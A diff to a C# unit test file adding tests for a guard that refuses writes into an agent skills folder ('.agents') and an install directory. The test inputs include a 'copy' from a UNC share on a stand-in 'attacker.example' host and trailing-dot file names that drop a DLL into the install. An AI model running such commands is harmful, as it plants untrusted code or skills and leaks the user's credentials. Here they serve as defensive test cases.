@@ -663,6 +663,44 @@ public sealed class WriteGuardInstallTests : IDisposable
         Assert.NotEmpty(looked);
     }
 
+    /// <summary>
+    /// A copy onto <c>.agents</c> from another computer is never looked at, and trips (2026-11-24, review #44): a look would hand that host the
+    /// user's credentials, as review P22-1 found.
+    /// </summary>
+    [WindowsFact]
+    public void ACopyOntoAgents_FromAnotherComputer_TripsUnlooked()
+    {
+        const string Host = "attacker.example";
+        var looked = new List<string>();
+        var guard = From(Site()) with { Looked = looked.Add };
+
+        Assert.NotNull(TrustedFilesPolice.Find("copy \\\\" + Host + "\\share\\x.md .agents", guard, out var finding, "cmd"));
+        Assert.Equal(TrustedFinding.ProjectSkills, finding);
+        Assert.DoesNotContain(looked, path => path.Contains(Host, StringComparison.OrdinalIgnoreCase));
+    }
+
+    /// <summary>A new library spelled with a trailing dot lands as the library (2026-11-24, review #9's neighbors): its extension is read trimmed.</summary>
+    [Fact]
+    public void ANewLibrary_WithATrailingDot_IsRefused_FromInsideTheInstall()
+    {
+        string inner = Path.Combine(_install, "docs");
+        Directory.CreateDirectory(inner);
+
+        Assert.NotNull(TrustedFilesPolice.Find("copy a.txt x.dll.", From(inner), out var finding));
+        Assert.Equal(TrustedFinding.Install, finding);
+    }
+
+    /// <summary>
+    /// The install's own name with a trailing dot, from its parent (2026-11-24, review #9's neighbors): Windows drops the dot, so
+    /// <c>copy x.dll install.</c> lands in the install, and the bare word's gate reads it trimmed.
+    /// </summary>
+    [WindowsFact]
+    public void TheInstallsName_WithATrailingDot_IsRefused_FromItsParent()
+    {
+        Assert.NotNull(TrustedFilesPolice.Find("copy x.dll " + Path.GetFileName(_install) + ".", From(_dir), out var finding));
+        Assert.Equal(TrustedFinding.Install, finding);
+    }
+
     [WindowsFact]
     public void OnAShare_TheInstallIsStillRefused_BySpelling()
     {
